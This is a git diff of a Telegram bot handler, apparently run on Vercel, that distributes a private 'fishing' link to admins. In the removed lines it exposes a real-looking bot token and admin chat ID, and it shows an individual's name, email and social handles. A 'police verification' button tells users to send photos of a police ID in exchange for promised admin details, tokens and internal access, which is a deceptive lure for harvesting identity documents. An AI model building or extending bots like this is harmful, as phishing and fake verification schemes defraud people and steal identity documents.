@@ -1,7 +1,7 @@
 // /api/bot.js
 
-const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
-const ADMIN_CHAT_ID = '7216371031';
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your real bot token
+const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID_HERE'; // Replace with your Telegram user ID as string
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 export default async function handler(req, res) {
@@ -18,12 +18,10 @@ export default async function handler(req, res) {
   const callbackQuery = body.callback_query;
 
   try {
-    // /start command
     if (text === '/start') {
       await sendWelcomeWithButtons(chatId);
     }
 
-    // Handle button callbacks
     if (callbackQuery) {
       const data = callbackQuery.data;
       const fromChatId = message.chat.id;
@@ -35,13 +33,17 @@ export default async function handler(req, res) {
           : `👤 *Admin Info*\nName: Muhammed Rishad AJ\nPhone: xxx\\-xxx\\-xxxx\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: @r1shaad\\_\\_`;
 
         await sendMessage(fromChatId, adminMessage);
-      } else if (data === 'fishing') {
+      }
+
+      else if (data === 'fishing') {
         const fishingMessage = isAdmin
-          ? `🎣 *Fishing Link (Private)*\n🔗 ||https://heavenscake.vercel.app/page.html||`
-          : `🚫 *This feature is for admins only.*\nFor enquiries, contact: @mohdrishad`;
+          ? `🎣 *Fishing Link \\(Private\\)*\n🔗 ||https://heavenscake\\.vercel\\.app/page\\.html||`
+          : `🚫 *This feature is for admins only\\.*\nFor enquiries, contact: @mohdrishad`;
 
         await sendMessage(fromChatId, fishingMessage);
-      } else if (data === 'police') {
+      }
+
+      else if (data === 'police') {
         await sendMessage(fromChatId,
           `🛂 *Police Verification Required*\n\nTo access confidential bot and admin details, please:\n\n1\\. 📸 Send a clear photo of your *Police ID*\n2\\. ✅ Wait for our admin to manually verify you\n\nOnce verified, you will receive:\n\n- 👤 Admin full name\n- 🎂 Date of Birth\n- 📞 Phone & WhatsApp number\n- 📧 Email address\n- 🤖 Bot command scripts\n- 🔐 API token & integrations\n- 🧰 Internal access features\n\n*Please note:* This is a secure process\\. Misuse or false identification will result in permanent ban\\.`);
       }
@@ -56,7 +58,7 @@ export default async function handler(req, res) {
   }
 }
 
-// 🔘 Welcome message with buttons
+// 👉 Welcome menu with inline buttons
 async function sendWelcomeWithButtons(chatId) {
   const payload = {
     chat_id: chatId,
@@ -88,7 +90,7 @@ async function sendWelcomeWithButtons(chatId) {
   });
 }
 
-// 📨 Send a message using MarkdownV2
+// 👉 Send a MarkdownV2 message
 async function sendMessage(chatId, message) {
   return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
@@ -101,7 +103,7 @@ async function sendMessage(chatId, message) {
   });
 }
 
-// ✅ Answer the callback to remove loading spinner
+// ✅ Answer the callback so Telegram UI doesn't spin forever
 async function answerCallback(callbackQueryId) {
   return fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
     method: 'POST',
